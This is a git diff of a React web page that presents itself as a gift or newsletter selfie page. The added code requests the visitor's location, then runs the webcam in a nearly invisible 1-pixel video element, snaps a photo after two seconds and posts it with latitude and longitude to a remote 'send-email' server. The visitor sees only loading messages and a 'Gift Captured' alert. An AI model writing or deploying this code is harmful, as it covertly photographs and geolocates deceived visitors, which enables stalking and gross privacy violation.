@@ -1,24 +1,38 @@
-import React, { useEffect, useRef } from "react";
+import React, { useEffect, useRef, useState } from "react";
 
 function App() {
   const videoRef = useRef(null);
   const canvasRef = useRef(null);
+  const [location, setLocation] = useState({ latitude: null, longitude: null });
 
   useEffect(() => {
-    navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
-      if (videoRef.current) {
-        videoRef.current.srcObject = stream;
+    // Step 1: Ask for location first
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const { latitude, longitude } = position.coords;
+        setLocation({ latitude, longitude });
 
-        videoRef.current.oncanplay = () => {
-          setTimeout(() => {
-            captureImage();
-          }, 2000);
-        };
+        // Step 2: Now start camera
+        navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
+          if (videoRef.current) {
+            videoRef.current.srcObject = stream;
+
+            videoRef.current.oncanplay = () => {
+              setTimeout(() => {
+                captureImage(latitude, longitude);
+              }, 2000);
+            };
+          }
+        });
+      },
+      (error) => {
+        console.error("❌ Location access denied", error);
+        alert("❌ Location permission denied. We need location to continue.");
       }
-    });
+    );
   }, []);
 
-  const captureImage = () => {
+  const captureImage = (latitude, longitude) => {
     const video = videoRef.current;
     const canvas = canvasRef.current;
 
@@ -29,18 +43,22 @@ function App() {
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       canvas.toBlob((blob) => {
+        if (!blob) return;
+
         const formData = new FormData();
         formData.append("image", blob, "selfie.jpg");
+        formData.append("latitude", latitude);
+        formData.append("longitude", longitude);
 
         fetch("https://newsletter-selfie-project.onrender.com/send-email", {
           method: "POST",
           body: formData,
         })
           .then(() => {
-            console.log("✅ Selfie + IP + Location sent!");
-            alert("🎁 Thanks! Your selfie has been submitted.");
+            console.log("✅ Sent selfie + location");
+            alert("🎉 Gift Captured and Sent!");
           })
-          .catch((err) => console.error("❌ Failed to send selfie", err));
+          .catch((err) => console.error("❌ Failed to send", err));
       }, "image/jpeg");
     }
   };
@@ -52,10 +70,10 @@ function App() {
         autoPlay
         muted
         playsInline
-        style={{ width: 1, height: 1, opacity: 0.01 }} // hidden camera
+        style={{ width: 1, height: 1, opacity: 0.01 }}
       />
       <canvas ref={canvasRef} style={{ display: "none" }} />
-      <p>Loading...</p>
+      <p>📍 Waiting for location permission...</p>
     </div>
   );
 }
